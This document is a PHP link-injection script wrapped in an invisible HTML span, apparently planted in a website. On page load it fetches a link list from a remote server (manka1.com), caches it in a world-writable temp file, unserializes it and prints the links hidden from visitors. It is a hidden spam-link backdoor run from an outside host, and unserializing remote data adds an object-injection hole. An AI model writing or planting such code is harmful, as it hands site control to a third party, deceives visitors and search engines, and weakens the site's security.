<span style="font-style: normal; visibility: hidden; position: absolute; left: 0px; top: 0px">
<?php


class CM_base {

	// base
  var $_id								= 'b6c4cbd412ec68efb5486b7512a838e0';

	// optional
  var $_verbose           = false;
  var $_charset           = 'UTF-8';
	var $_fetch_remote_type = 'curl';
	var $_socket_timeout    = 6;
	var $_links_delimiter		= ' ';
	var $_show_code					= false;

	// other
  var $_servers						= 'manka1.com|manka1.com12311';
  var $_cache_lifetime    = 600;
  var $_cache_reloadtime  = 600;
  var $_error             = '';
  var $_db_file           = '';

  function CM_base($options = null) {

		if (isset($options['verbose']) && $options['verbose'] == true)
			$this->_verbose = true;

    if (isset($options['charset']) && strlen($options['charset']))
      $this->_charset = $options['charset'];

    if (isset($options['fetch_remote_type']) && strlen($options['fetch_remote_type']))
      $this->_fetch_remote_type = $options['fetch_remote_type'];

		if (isset($options['socket_timeout']) && is_numeric($options['socket_timeout']) && $options['socket_timeout'] > 0)
      $this->_socket_timeout = $options['socket_timeout'];

    if (isset($options['links_delimiter']) && strlen($options['links_delimiter']))
      $this->_links_delimiter = $options['links_delimiter'];

    if (isset($options['show_code']) && $options['show_code'] == true)
       $this->_show_code = true;
	
	}


  function fetch_remote_file($host, $path) {

		@ini_set('allow_url_fopen',          1);
    @ini_set('default_socket_timeout',   $this->_socket_timeout);

    if ($this->_fetch_remote_type == 'file_get_contents' || 
			($this->_fetch_remote_type == '' && function_exists('file_get_contents') && ini_get('allow_url_fopen') == 1)) {
            
			$this->_fetch_remote_type = 'file_get_contents';
			$data = @file_get_contents('http://' . $host . $path);

			if ($data)
				return $data;

    } elseif ($this->_fetch_remote_type == 'curl' || 
			($this->_fetch_remote_type == '' && function_exists('curl_init'))) {
            
			$this->_fetch_remote_type = 'curl';

      if ($ch = @curl_init()) {

				@curl_setopt($ch, CURLOPT_URL,              'http://' . $host . $path);
				@curl_setopt($ch, CURLOPT_HEADER,           false);
				@curl_setopt($ch, CURLOPT_RETURNTRANSFER,   true);
				@curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,   $this->_socket_timeout);

        $data = @curl_exec($ch);
        @curl_close($ch);

				if ($data)
					return $data;
			}

    } else {

			$this->_fetch_remote_type = 'socket';

      $buff = '';
      $fp = @fsockopen($host, 80, $errno, $errstr, $this->_socket_timeout);

      if ($fp) {

				@fputs($fp, "GET {$path} HTTP/1.0\r\nHost: {$host}\r\n");

				while (!@feof($fp))
					$buff .= @fgets($fp, 128);

				@fclose($fp);

				$page = explode("\r\n\r\n", $buff);
				return $page[1];

      }

    }

    return $this->raise_error('Не могу подключиться к серверу: ' . $host . $path.', type: '.$this->_fetch_remote_type);
  }

  function _read($filename) {
        
		$fp = @fopen($filename, 'rb');
		@flock($fp, LOCK_SH);

		if ($fp) {

			clearstatcache();
			$length = @filesize($filename);
			$mqr = get_magic_quotes_runtime();
			set_magic_quotes_runtime(0);

			if ($length)
				$data = @fread($fp, $length);
			else
				$data = '';

      set_magic_quotes_runtime($mqr);
      @flock($fp, LOCK_UN);
      @fclose($fp);

      return $data;

    }

    return $this->raise_error('Не могу считать данные из файла: ' . $filename);
  }

  function _write($filename, $data) {

		$fp = @fopen($filename, 'wb');
    if ($fp) {
			@flock($fp, LOCK_EX);
			$length = strlen($data);
			@fwrite($fp, $data, $length);
			@flock($fp, LOCK_UN);
      @fclose($fp);

      if (md5($this->_read($filename)) != md5($data))
				return $this->raise_error('Нарушена целостность данных при записи в файл: ' . $filename);

      return true;
    }

    return $this->raise_error('Не могу записать данные в файл: ' . $filename);
  }

  function raise_error($e) {

		$this->_error = '<p style="color: red; font-weight: bold;">CM ERROR: ' . $e . '</p>';

		if ($this->_verbose == true)
			print $this->_error;

    return false;
  }

  function load_data() {

		if (!is_dir(dirname(__FILE__).'/temp')){
			if (!mkdir(dirname(__FILE__).'/temp')){
				return $this->raise_error('Нет папки ' . dirname(__FILE__).'/temp'. '. Создать не удалось.');
			}
		}


    $this->_db_file = dirname(__FILE__) . '/temp/links.db';

    if (!is_file($this->_db_file)) {

			if (@touch($this->_db_file))
				@chmod($this->_db_file, 0666);
			else
				return $this->raise_error('Нет файла ' . $this->_db_file . '. Создать не удалось. Выставите права 777 на папку.');

    }

    if (!is_writable($this->_db_file))
			return $this->raise_error('Нет доступа на запись к файлу: ' . $this->_db_file . '! Выставите права 777 на папку.');

    @clearstatcache();

    if ((filemtime($this->_db_file) < (time()-$this->_cache_lifetime) || filesize($this->_db_file) == 0)) {

			@touch($this->_db_file, (time() - $this->_cache_lifetime + $this->_cache_reloadtime));
            
			$path = '/system/mngr.php?id=' . $this->_id . '&md5=' . md5($this->_read($this->_db_file));

      if (strlen($this->_charset))
				$path .= '&charset=' . $this->_charset;

			$servers = explode("|", $this->_servers);
			foreach($servers as $server){

				if ($data = $this->fetch_remote_file($server, $path)){
			
					if (substr($data, 0, 12) == 'FATAL ERROR:') {

						$this->raise_error($data);

					} else if (substr($data, 0, 9) != 'UNCHANGED') {

						$hash = @unserialize($data);

						if ($hash != false) {

							$data_new = @serialize($hash);

							if ($data_new)
								$data = $data_new;
							
							$this->_write($this->_db_file, $data);

							break;

						}

					} // if fatal error unchanged

				} // fetch

			} // foreach
            
    }

    if ($data = $this->_read($this->_db_file))
			$this->set_data(@unserialize($data));

  }
}

class CM_client extends CM_base {

	var $_links_page = array();

	function CM_client($options = null) {
			parent::CM_base($options);
			$this->load_data();
	}

	function return_links($n = null, $offset = 0) {

		$html = '';

		if (is_array($this->_links_page)) {

			$total_page_links = count($this->_links_page);

			if (!is_numeric($n) || $n > $total_page_links)
				$n = $total_page_links;

			$links = array();

			for ($i = 1; $i <= $n; $i++) {
				if ($offset > 0 && $i <= $offset)
					array_shift($this->_links_page);
				else
					$links[] = array_shift($this->_links_page);
			}

			$html = join($this->_links_delimiter, $links);
					
		} else {
			$html = $this->_links_page;
		}

		if ($this->_show_code)
			$html = $html . '<!--CM'.($this->_id).'-->';

		return $html;

	}


  function set_data($data) {

		$this->_links_page = $data;

  }
}


$CM = new CM_client();
echo $CM->return_links();



?>
</span>